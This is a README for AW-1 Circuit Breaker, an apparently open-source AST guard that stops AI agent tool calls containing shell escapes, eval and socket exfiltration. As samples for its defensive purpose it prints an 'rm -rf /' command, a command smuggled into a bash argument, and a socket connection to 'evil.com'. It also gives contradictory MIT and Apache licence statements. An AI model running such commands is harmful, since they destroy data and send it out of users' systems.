<!-- hol-install-block:v2 slug=mvikmanners/aw1-circuit-breaker -->
Install with [HOL Guard](https://hol.org/guard/docs/plugin-scanner/install-with-hol-guard), which checks the [HOL listing](https://hol.org/registry/plugins/mvikmanners%2Faw1-circuit-breaker) and asks before each runtime:

```sh
hol-guard plugin install mvikmanners/aw1-circuit-breaker --apply
```

Get HOL Guard with `pipx install hol-guard` or `uv tool install hol-guard`.

<details>
<summary>Install with each runtime's own CLI</summary>

| Runtime | Commands |
| --- | --- |
| Claude Code | `claude plugin marketplace add mvikmanners/aw1-circuit-breaker`<br>`claude plugin install aw1-circuit-breaker@aw1-circuit-breaker` |
| Codex | `codex plugin marketplace add mvikmanners/aw1-circuit-breaker`<br>`codex plugin add aw1-circuit-breaker@aw1-circuit-breaker` |

</details>
<!-- /hol-install-block -->

# AW-1 Circuit Breaker

[![HOL Guard](https://img.shields.io/endpoint?url=https%3A%2F%2Fhol.org%2Fapi%2Fregistry%2Fbadges%2Fplugin%3Fslug%3Dmvikmanners%252Faw1-circuit-breaker%26metric%3Drelease)](https://hol.org/registry/plugins/mvikmanners%2Faw1-circuit-breaker?utm_source=hol_marketplace&utm_medium=plugins_badge&utm_campaign=plugins&utm_content=mvikmanners%2Faw1-circuit-breaker)





[![Glama](https://glama.ai/mcp/servers/mvikmanners/aw1-circuit-breaker/badge)](https://glama.ai/mcp/servers/mvikmanners/aw1-circuit-breaker)

[![PyPI version](https://img.shields.io/pypi/v/aw1-circuit-breaker.svg?color=blue)](https://pypi.org/project/aw1-circuit-breaker/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
[![Latency](https://img.shields.io/badge/AST%20Evaluation-%3C0.2ms-brightgreen.svg)]()

> Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers.

---

## ⚡ 10-Second Test Drive (Zero-Install)

Test the circuit breaker live in your terminal right now without installing anything:

```bash
uvx aw1-circuit-breaker --demo
```

Or verify an arbitrary snippet:

```bash
uvx aw1-circuit-breaker verify "subprocess.run(['rm', '-rf', '/'])"
```

---

# AW-1 Circuit Breaker

[![Glama Score](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker/badges/score.svg)](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker)

Deterministic AST deconstruction and runtime circuit breaker preventing rogue shell escapes, dynamic eval(), and covert lateral socket egress in autonomous LLM tool calls.

## Installation

```bash
pip install -r requirements.txt
```

## Running the Server

Run directly with Python:
```bash
python mcp_server.py
```

Or via uvx:
```bash
uvx mcp_server.py
```

## MCP Client Configuration

```json
{
  "mcpServers": {
    "aw1-circuit-breaker": {
      "command": "python",
      "args": ["mcp_server.py"]
    }
  }
}
```

## Exploit Interception in Action

AW-1 operates deterministically at the Abstract Syntax Tree (AST) level before code reaches Python's runtime execution frame. Probabilistic prompt-based guardrails fail under encoding obfuscation; AST inspection guarantees deterministic enforcement.

### Interception Matrix

| Attack Vector | Attacker Strategy | LLM Guardrail Result | AW-1 AST Circuit Breaker |
|---|---|---|---|
| **Dynamic Execution** | `eval(compile(...))` | Evades semantic filters | **Tripped (`RESTRICTED_INVOCATION`)** |
| **Shell Escapes** | `subprocess.Popen(['bash', ...])` | Masked as system task | **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |
| **Lateral Exfiltration** | `socket.connect(('evil.com', 443))` | Disguised as HTTP fetch | **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |

### Run the Showcase

```bash
python examples/exploit_showcase.py
```

## Runtime Latency Telemetry

Deterministic security must not throttle agent execution. AW-1 operates with sub-millisecond AST parsing and microsecond-scale argument filtering across warm execution loops.

*Sample Size: 1,000 synthetic iterations per test vector on Debian Python 3.13.*

| Evaluation Target | p50 Latency | p95 Latency | p99 Latency | Status |
|---|---|---|---|---|
| **AST Inspection (Benign Payload)** | **0.0889 ms** | 0.1298 ms | 0.1645 ms | `< 0.2 ms` Overhead |
| **AST Inspection (Adversarial Exploit)** | **0.0520 ms** | 0.0919 ms | 0.1051 ms | Instant Breakout Halt |
| **Shell Argument Injection Guard** | **0.0051 ms** | 0.0096 ms | 0.0195 ms | Sub-20 µs Inspection |

Reproduce locally:
```bash
python benchmark.py
```

## Framework Integration (LangGraph Example)

AW-1 drops directly into autonomous agent execution nodes prior to tool dispatch:

```python
from examples.langgraph_adapter import execute_agent_action, CircuitBreakerException

# Guard autonomous agent tool dispatches
try:
    execute_agent_action(bash_tool, "bash_tool", {"cmd": "cat log.txt; rm -rf /"})
except CircuitBreakerException as blocked:
    print(f"Tool call halted: {blocked}")
```

## License

Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0). See [LICENSE](LICENSE) for details.


---

## 💳 Cloud Gateway & Commercial Licensing

While the open-source AST circuit breaker runs entirely local with sub-0.2ms overhead, enterprise teams and autonomous agent labs can connect to the hosted **AW-1 Sovereign Cloud Gateway** at `https://p20.laveto.net` for centralized policy orchestration, statutory audit compliance (BoB & Botswana DPA 2018), and hardware TEE attestation tokens.

| Tier | Price | Monthly Quota | Features | Checkout |
| :--- | :--- | :--- | :--- | :--- |
| **Developer Pro** | **BWP 650.00 / mo** ($49 USD) | 100,000 Verified Audits | 1 commercial license key, offline HMAC validation, Layer 0 AST unpacker, community support | [👉 Subscribe Now](https://p20.laveto.net/wisdom/buy) |
| **Team / Startup** | **BWP 2,650.00 / mo** ($199 USD) | 1,000,000 Verified Audits | 5 developer seat keys, Redis distributed state sync, rolling velocity caps, priority alerts | [👉 Subscribe Team](https://p20.laveto.net/wisdom/buy?tier=team) |
| **Enterprise Dedicated** | **BWP 13,200.00 / mo** ($990 USD) | Unlimited Verified Audits | Dedicated gateway tenant, custom statutory risk lenses, SLA guarantees, SHA-256 Decision Assurance Dossiers | [💬 Contact Enterprise](mailto:command@laveto.net) |

*Self-hosted open-source circuit breaking remains 100% free under the Apache-2.0 license.*Fri Oct 30 18:01:42 UTC 2026
